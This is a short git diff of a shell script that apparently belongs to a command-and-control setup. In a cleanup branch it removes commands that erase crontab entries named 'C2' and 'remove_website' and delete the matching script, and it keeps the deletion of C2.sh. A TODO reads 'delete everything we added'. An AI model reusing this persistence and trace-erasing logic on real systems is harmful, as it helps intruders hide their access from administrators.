@@ -15,16 +15,7 @@ do
     if [[ 100 < 1 ]]; then
         echo "image hasn't been uploaded"
 
-        #remove references in cron
-        crontab -l > crontab_new 
-        sed -i '' -e '/C2/d' crontab_new
-        sed -i '' -e '/remove_website/d' crontab_new
-        #TODO: should delete "java" file (delete everything we added)
-        crontab crontab_new
-        rm crontab_new
-
         #remove scripts
-        rm remove_website.sh
         rm C2.sh
 
         echo "delete" 
